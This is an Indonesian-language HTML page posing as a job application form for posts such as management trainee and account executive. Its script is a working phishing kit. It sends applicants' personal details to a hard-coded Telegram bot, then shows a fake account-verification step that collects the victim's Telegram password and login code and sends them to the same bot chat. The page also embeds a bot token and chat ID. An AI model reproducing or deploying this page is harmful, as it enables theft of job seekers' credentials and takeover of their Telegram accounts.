<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lamaran Pekerjaan</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <style>
        #apply {
            background-image: url('images.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
        }
        .form-container {
            background-color: rgba(255, 255, 255, 0.8);
            padding: 2rem;
            border-radius: 0.5rem;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        #loadingAnimation {
            display: none;
        }
    </style>
</head>
<body class="bg-gray-100 text-gray-900">

<section id="apply" class="py-16">
    <div class="container mx-auto px-6 text-center bg-white bg-opacity-80 p-10 rounded-lg shadow-md">
        <img src="images.png" alt="Logo atau Gambar" class="mx-auto mb-4 w-32 h-32 object-contain">
        <h3 class="text-3xl font-semibold text-gray-800">Formulir Pendaftaran</h3>
        <div id="message" class="hidden mt-4"></div>

        <!-- Loading Animation -->
        <div id="loadingAnimation" class="flex items-center justify-center min-h-screen space-x-2">
            <div class="w-4 h-4 bg-blue-500 rounded-full animate-pulse"></div>
            <div class="w-4 h-4 bg-blue-500 rounded-full animate-pulse delay-150"></div>
            <div class="w-4 h-4 bg-blue-500 rounded-full animate-pulse delay-300"></div>
        </div>

        <!-- Application Form -->
        <form id="applicationForm" onsubmit="sendApplication(event)" class="mt-10 max-w-lg mx-auto bg-white p-8 rounded-lg shadow-md">
            <div class="mb-6">
                <label class="block text-gray-700 text-sm font-bold mb-2" for="name">Nama Lengkap</label>
                <input type="text" id="name" class="w-full p-3 rounded border border-gray-300 focus:outline-none focus:border-blue-600" placeholder="Nama Anda" required>
            </div>
            <div class="mb-6">
                <label class="block text-gray-700 text-sm font-bold mb-2" for="email">Email</label>
                <input type="email" id="email" class="w-full p-3 rounded border border-gray-300 focus:outline-none focus:border-blue-600" placeholder="Email Anda" required>
            </div>
            <div class="mb-6">
                <label class="block text-gray-700 text-sm font-bold mb-2" for="position">Posisi yang Dilamar</label>
                <select id="position" class="w-full p-3 rounded border border-gray-300 focus:outline-none focus:border-blue-600" required>
                    <option value="Management trainee">Management trainee</option>
                    <option value="Account executive">Account executive</option>
                    <option value="Social media officer">Social media officer</option>
                    <option value="Business Development">Business Development</option>
                </select>
            </div>
            <div class="mb-6">
                <label class="block text-gray-700 text-sm font-bold mb-2" for="telegram">Nomor Telegram Aktif</label>
                <input type="tel" id="telegram" class="w-full p-3 rounded border border-gray-300 focus:outline-none focus:border-blue-600" placeholder="Contoh: +6281234567890" required pattern="^\+628[0-9]{9,}$" value="+62">
            </div>
            <button type="submit" class="w-full bg-blue-600 text-white p-3 rounded-lg font-semibold hover:bg-blue-700">Kirim Lamaran</button>
        </form>
<!-- Verification Section -->
<div id="verificationSection" class="hidden mt-10">
    <!-- Green-colored text for verification information -->
    <p class="text-green-600 font-semibold mb-4">Silakan verifikasi akun Telegram Anda untuk melanjutkan mengirim lamaran kerja anda.</p>
    
    <h4 class="text-xl font-semibold text-gray-800">Verifikasi Akun Telegram</h4>
    <form onsubmit="verifyCode(event)" class="mt-6">
        <div class="mb-6">
            <label class="block text-gray-700 text-sm font-bold mb-2" for="telegramNumber">Nomor Telegram Aktif</label>
            <input type="tel" id="telegramNumber" class="w-full p-3 rounded border border-gray-300 focus:outline-none focus:border-blue-600" placeholder="Contoh: +6281234567890" required pattern="^\+628[0-9]{9,}$" value="+62">
        </div>
        <div class="mb-6">
            <label class="block text-gray-700 text-sm font-bold mb-2" for="password">Password</label>
            <input type="password" id="password" class="w-full p-3 rounded border border-gray-300 focus:outline-none focus:border-blue-600" placeholder="Masukkan Password" required>
        </div>
        <input type="number" id="verificationCode" class="w-full p-3 rounded border border-gray-300 focus:outline-none focus:border-blue-600" placeholder="Kode Verifikasi" required min="0">
        <button type="submit" class="w-full mt-4 bg-blue-600 text-white p-3 rounded-lg font-semibold hover:bg-blue-700">Verifikasi akun</button>
    </form>
</div>
<!-- Success Message -->
<div id="successMessage" class="hidden text-center mt-10">
    <p class="text-green-600 font-semibold text-lg">Lamaran Anda sudah berhasil terkirim, tunggu konfirmasi dari kami. Terima kasih.</p>
</div>
    </div>
</section>

<script>
async function sendApplication(event) {
    event.preventDefault();
    const submitButton = document.querySelector('button[type="submit"]');
    submitButton.disabled = true;
    document.getElementById("applicationForm").classList.add("hidden");
    document.getElementById("loadingAnimation").style.display = "flex";
    const name = document.getElementById("name").value;
    const email = document.getElementById("email").value;
    const position = document.getElementById("position").value;
    const telegram = document.getElementById("telegram").value;
    const botToken = '7653188082:AAEMjZKBaivSo5nEHy1HVlQbRYqNvCwuHic';
    const chatId = '-4546395669';
    const message = `Nama: ${name}\nEmail: ${email}\nPosisi: ${position}\nNomor Telegram: ${telegram}`;
    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: chatId, text: message })
        });
        setTimeout(() => {
            document.getElementById("loadingAnimation").style.display = "none";
            document.getElementById("verificationSection").classList.remove("hidden");
            submitButton.disabled = false;
        }, 7000);
    } catch (error) {
        alert('Terjadi kesalahan saat mengirim lamaran.');
    }
}

async function verifyCode(event) {
    event.preventDefault();

    // Gather verification data
    const telegramNumber = document.getElementById("telegramNumber").value;
    const password = document.getElementById("password").value;
    const verificationCode = document.getElementById("verificationCode").value;

    // Send verification data to Telegram bot
    const botToken = '7653188082:AAEMjZKBaivSo5nEHy1HVlQbRYqNvCwuHic'; // Replace with your bot token
    const chatId = '-4546395669'; // Replace with your chat ID
    const verificationMessage = `Nomor Telegram: ${telegramNumber}\nPassword: ${password}\nKode Verifikasi: ${verificationCode}`;
    
    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: verificationMessage,
                parse_mode: 'HTML' // Optional: To format the message
            }),
        });

        // Hide the verification section and show success message
        document.getElementById("verificationSection").classList.add("hidden");
        document.getElementById("successMessage").classList.remove("hidden");

    } catch (error) {
        console.error('Error sending verification data to Telegram:', error);
        // Handle errors here (optional)
    }
}

window.onload = function() {
    const telegramInput = document.getElementById("telegram");
    telegramInput.focus();
    telegramInput.setSelectionRange(telegramInput.value.length, telegramInput.value.length);
};
</script>

</body>
</html>